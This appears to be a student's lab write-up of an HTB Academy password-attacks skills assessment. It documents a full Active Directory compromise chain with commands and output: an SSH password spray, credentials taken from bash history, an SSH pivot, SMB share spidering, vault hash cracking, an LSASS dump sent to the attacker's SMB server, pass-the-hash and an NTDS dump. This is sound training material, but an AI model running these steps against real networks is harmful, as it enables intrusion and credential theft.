From [Password Attacks](./Password%20Attacks.md):

# The Credential Theft Shuffle

[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by `Sean Metcalf`, is a systematic approach attackers use to compromise Active Directory environments by exploiting `stolen credentials`. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to `move laterally across the network`. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and `gain control over the domain`, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the `Local Administrator Password Solution (LAPS)`, enforcing `multi-factor authentication`, and `restricting administrative privileges` to mitigate such attacks.
## Skills Assessment

`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:
### Pivoting Primer

The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.
### Objective

`NTLM` hash of `NEXURA\Administrator`

# Scan / Recon

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ rustscan -a 10.129.234.116 -- -A  

Open 10.129.234.116:22
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   234.63 ms 10.10.14.1
2   347.88 ms 10.129.234.116
```
# Foothold Enum

```bash
┌──(mdn0x㉿mdn0xKali)-[~/Documenti/GitTools/username-anarchy]
└─$ ./username-anarchy -i ~/HTB/Academy/passwd_attacks/user > ~/HTB/Academy/passwd_attacks/betty_usernames.txt 


$ hydra -L betty_usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 
[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
```

[SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) in the foothold:

```bash
└─$ ssh jbetty@10.129.234.116 

jbetty@DMZ01:~$ sudo -l
[sudo] password for jbetty: 
Sorry, user jbetty may not run sudo on DMZ01.

jbetty@DMZ01:~$ crontab -l
no crontab for jbetty

jbetty@DMZ01:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:83:06 brd ff:ff:ff:ff:ff:ff
    inet 10.129.207.107/16 brd 10.129.255.255 scope global dynamic ens160
       valid_lft 3177sec preferred_lft 3177sec
    inet6 dead:beef::250:56ff:fe8a:8306/64 scope global dynamic mngtmpaddr 
       valid_lft 86394sec preferred_lft 14394sec
    inet6 fe80::250:56ff:fe8a:8306/64 scope link 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:01:6f brd ff:ff:ff:ff:ff:ff
    inet 172.16.119.13/24 brd 172.16.119.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:16f/64 scope link 
       valid_lft forever preferred_lft forever
```
## LinPEAS

```bash
jbetty@DMZ01:~$ wget http://10.10.15.150:8080/linpeas.sh
--2026-11-21 13:56:24--  http://10.10.15.150:8080/linpeas.sh
Connecting to 10.10.15.150:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134168 (131K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                100%[=====================================>] 131.02K  82.7KB/s    in 1.6s    

2026-11-21 13:56:26 (82.7 KB/s) - ‘linpeas.sh’ saved [134168/134168]

jbetty@DMZ01:~$ chmod +x linpeas.sh 
jbetty@DMZ01:~$ ./linpeas.sh 

===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                                                                         
DMZ01                                                                                                                                                                                                               
127.0.0.1 localhost
127.0.1.1 ubuntu
172.16.119.11 nexura.htb DC01 DC01.nexura.htb
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

[+] Networks and neighbours
# symbolic names for networks, see networks(5) for more information                                                                                                                                                 
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.234.116  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe8a:4967  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe8a:4967  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:8a:49:67  txqueuelen 1000  (Ethernet)
        RX packets 77498  bytes 6088945 (6.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 72787  bytes 4197214 (4.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.119.13  netmask 255.255.255.0  broadcast 172.16.119.255
        inet6 fe80::250:56ff:fe8a:9606  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:8a:96:06  txqueuelen 1000  (Ethernet)
        RX packets 866  bytes 54088 (54.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 37  bytes 3126 (3.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

10.129.0.1 dev ens160 lladdr 00:50:56:8a:b1:48 REACHABLE
fe80::250:56ff:fe8a:b148 dev ens160 lladdr 00:50:56:8a:b1:48 router STALE
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.129.0.1      0.0.0.0         UG    0      0        0 ens160
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens160
172.16.119.0    0.0.0.0         255.255.255.0   U     0      0        0 ens192

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                 
Active Internet connections (servers and established)                                                                                                                                                               
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0  24938 10.129.234.116:22       10.10.15.150:48952      ESTABLISHED -                   
tcp        0      1 10.129.234.116:54086    8.8.8.8:53              SYN_SENT    -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.1:48834         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   


Looking for possible passwords inside /home/jbetty/.bash_history
sudo apt update                                                                                                                                                                                                    
sudo apt upgrade -y
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
sudo systemctl status apache2
sudo systemctl restart apache2
sudo nano default
sudo nginx -t
sudo systemctl reload nginx
ssh user@192.168.0.101
scp file.txt user@192.168.0.101:~/Documents/
sudo tail -f syslog
sudo journalctl -xe
sudo dmesg | less
sudo adduser testuser
sudo usermod -aG sudo testuser
su - testuser
passwd
sudo apt install tree
unzip archive.zip
su
```
We found:

| User     | passwd              | IP            |
| -------- | ------------------- | ------------- |
| hwilliam | dealer-screwed-gym1 | 172.16.119.10 |
# Pivoting to JUMP01

Set the [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) tunnel:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ ssh -D 9000 jbetty@10.129.234.116
```
## JUMP01 Initial Enumeration

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ proxychains nxc smb 172.16.119.10 -u "hwilliam" -p "dealer-screwed-gym1" --shares

SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-screwed-gym1 
SMB         172.16.119.10   445    FILE01           [*] Enumerated shares
SMB         172.16.119.10   445    FILE01           Share           Permissions     Remark              
SMB         172.16.119.10   445    FILE01           -----           -----------     ------              
SMB         172.16.119.10   445    FILE01           ADMIN$                          Remote Admin        
SMB         172.16.119.10   445    FILE01           C$                              Default share       
SMB         172.16.119.10   445    FILE01           HR              READ,WRITE                          
SMB         172.16.119.10   445    FILE01           IPC$            READ            Remote IPC          
SMB         172.16.119.10   445    FILE01           IT                                                  
SMB         172.16.119.10   445    FILE01           MANAGEMENT                                          
SMB         172.16.119.10   445    FILE01           PRIVATE         READ,WRITE                          
SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE  
```

Now we `--spider` as in the lessons:

```bash
proxychains nxc smb 172.16.119.10 -u "hwilliam" -p "dealer-screwed-gym1" --spider HR --pattern "password"

SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/2024/Password Policy 2024.doc [lastm:'2025-04-29 18:08' size:32768]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/2025/Password Policy 2025.doc [lastm:'2025-04-29 18:05' size:32768]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD.plk [lastm:'2025-04-29 17:25' size:48]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD.psafe3 [lastm:'2025-04-29 17:25' size:1080]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD_011.ibak [lastm:'2025-04-29 17:25' size:856]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD_012.ibak [lastm:'2025-04-29 17:25' size:904]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD_013.ibak [lastm:'2025-04-29 17:25' size:952]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Password Policy OUTDATED.doc [lastm:'2025-04-29 18:10' size:32768]  
```

The interesting file is `Employee-Passwords_OLD.psafe3`

We can pull the file with [SMBclient](../../../3%20-%20Tags/Hacking%20Tools/SMBclient.md):

```bash
└─$ proxychains smbclient //172.16.119.10/HR -U "nexura.htb/hwilliam" 

smb: \Archive\> get Employee-Passwords_OLD.psafe3
getting file \Archive\Employee-Passwords_OLD.psafe3 of size 1080 as Employee-Passwords_OLD.psafe3 (0,9 KiloBytes/sec) (average 0,9 KiloBytes/sec)
```

Pull the password [Hash](../../../3%20-%20Tags/Hacking%20Concepts/Hash.md) associated with the file using`pwsafe2john` and crack the hash:

```bash
─$ pwsafe2john Employee-Passwords_OLD.psafe3 > psafe.hash  

─$ john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
michaeljackson   (Employee-Passwords_OLD)     
```

Open the vault with the password:

```bash
$ sudo apt install passwordsafe
```

`caramel-cigars-reply1`          `bdavid`
## RDP into JUMP01

We can use [RDP](../../../3%20-%20Tags/RDP.md):

```bash
$ └─$ proxychains xfreerdp /v:172.16.119.7 /u:bdavid /d:nexura.htb /p:caramel-cigars-reply1  
```
# Exploiting JUMP01

We can dump `lsass.DMP` Select `Create dump file` in `TaskManager`
![Pasted image 20261121173742.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020261121173742.png)

A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/mdn0x/HTB/Academy/passwd_attacks 

move lsass.DMP \\10.10.15.150\CompData
```
## Crack the LSASS.DMP

We can use `pypykatz` to crack the hashes:

```bash
pypykatz lsa minidump lsass.DMP
```
## PassTheHash

We use [NetExec](../../../3%20-%20Tags/Hacking%20Tools/NetExec.md) to Pass the Hash of  `stom`:

```bash
proxychains nxc smb 172.16.119.11 -u stom -d NEXURA.HTB -H 
```
## Dumping NTDS.dit

We use [NetExec](../../../3%20-%20Tags/Hacking%20Tools/NetExec.md) to dump all hashes:

```bash
proxychains nxc smb 172.16.119.11 -u stom -H  --ntds
```